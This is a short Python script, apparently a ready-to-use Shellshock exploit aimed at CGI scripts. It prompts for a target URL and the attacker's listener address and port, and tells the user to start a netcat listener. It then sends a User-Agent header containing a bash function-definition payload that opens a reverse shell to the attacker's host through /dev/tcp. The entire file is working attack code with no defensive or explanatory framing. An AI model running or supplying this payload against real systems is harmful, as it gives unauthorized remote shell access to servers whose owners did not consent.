import sys
import time
import requests

host = input("Enter the full url of target (http://target/cgi-bin/vulnerable.sh)\n")
req = requests.get(host)
status = req.status_code
lhost = input("Your LHOST: ")
lport = input("Your LPORT: ")
print(
    f"""
Targets Status code is {status}
--------------------------------------
Target     : {host}
LHOST	   : {lhost}
LPORT      : {lport}
--------------------------------------
"""
)
choose = input("Is this correct? [y/n]:")
if choose == "y" or choose == "Y":
    print(f"\n\nPlease run 'nc -lnvp {lport}' in another terminal")
    time.sleep(1)
    choose = input("Did you execute it? [y/n]: ")
    headers = {
        "User-Agent": "() {{ :; }}; /bin/bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(
            lhost, lport
        )
    }
    requests.get(host, headers=headers)
elif choose == "n" or choose == "N":
    print("Exiting...")
    time.sleep(0.5)
    sys.exit()
